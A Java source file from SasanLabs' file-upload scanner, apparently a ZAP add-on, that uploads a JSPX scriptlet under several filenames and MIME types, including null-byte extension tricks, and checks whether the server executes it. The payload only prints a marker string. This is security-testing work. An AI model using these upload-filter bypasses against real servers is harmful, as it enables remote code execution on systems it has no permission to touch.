/**
 * Copyright 2020 SasanLabs
 *
 * <p>Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file
 * except in compliance with the License. You may obtain a copy of the License at
 *
 * <p>http://www.apache.org/licenses/LICENSE-2.0
 *
 * <p>Unless required by applicable law or agreed to in writing, software distributed under the
 * License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
 * express or implied. See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.sasanlabs.fileupload.attacks.rce.jsp;

import static org.sasanlabs.fileupload.Constants.NULL_BYTE_CHARACTER;

import java.io.IOException;
import java.util.Arrays;
import java.util.List;
import org.sasanlabs.fileupload.attacks.AttackVector;
import org.sasanlabs.fileupload.attacks.FileUploadAttackExecutor;
import org.sasanlabs.fileupload.attacks.beans.FileExtensionOperation;
import org.sasanlabs.fileupload.attacks.beans.FileParameter;
import org.sasanlabs.fileupload.exception.FileUploadException;
import org.sasanlabs.fileupload.matcher.ContentMatcher;
import org.sasanlabs.fileupload.matcher.impl.MD5HashResponseMatcher;

/** @author KSASAN preetkaran20@gmail.com */
public class PlainOldJSPXRemoteCodeExecution implements AttackVector {

    private static final String JSPX_UPLOADED_FILE_BASE_NAME = "PlainOldJSPXRemoteCodeExecution_";
    // Payload from resource file: "jspx_payload.jspx"
    private static final String JSPX_PAYLOAD =
            "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\"  version=\"1.2\"> \n"
                    + "<jsp:directive.page contentType=\"text/html\" pageEncoding=\"UTF-8\" /> \n"
                    + "<jsp:scriptlet> \n"
                    + "    out.print(\"PlainOldJSPXRemoteCodeExecution_\"); \n"
                    + "	 out.print(\"SasanLabs_ZAP_Identifier\");"
                    + "</jsp:scriptlet> \n"
                    + "</jsp:root>";

    private static final ContentMatcher CONTENT_MATCHER =
            new MD5HashResponseMatcher("PlainOldJSPXRemoteCodeExecution_SasanLabs_ZAP_Identifier");

    // Need to validate
    // application/x-httpd-jsp
    // text/x-jsp
    private static final List<FileParameter> FILE_PARAMETERS =
            Arrays.asList(
                    new FileParameter("jspx"),
                    new FileParameter("jspx", "application/x-jsp"),
                    new FileParameter("jspx", FileExtensionOperation.PREFIX_ORIGINAL_EXTENSION),
                    new FileParameter(
                            "jspx",
                            "application/x-jsp",
                            FileExtensionOperation.PREFIX_ORIGINAL_EXTENSION),
                    new FileParameter(
                            "jspx" + NULL_BYTE_CHARACTER,
                            FileExtensionOperation.SUFFIX_ORIGINAL_EXTENSION),
                    new FileParameter(
                            "jspx" + NULL_BYTE_CHARACTER,
                            "application/x-jsp",
                            FileExtensionOperation.SUFFIX_ORIGINAL_EXTENSION));

    @Override
    public boolean execute(FileUploadAttackExecutor fileUploadAttackExecutor)
            throws FileUploadException {
        boolean result = false;
        try {
            result =
                    this.genericAttackExecutor(
                            fileUploadAttackExecutor,
                            CONTENT_MATCHER,
                            JSPX_PAYLOAD,
                            JSPX_UPLOADED_FILE_BASE_NAME,
                            FILE_PARAMETERS);
            if (result) {
                fileUploadAttackExecutor
                        .getFileUploadScanRule()
                        .raiseAlert(
                                1,
                                1,
                                "",
                                "",
                                "",
                                "",
                                "",
                                "",
                                "",
                                fileUploadAttackExecutor.getOriginalHttpMessage());
            }
        } catch (IOException e) {
            throw new FileUploadException(e);
        }
        return result;
    }
}
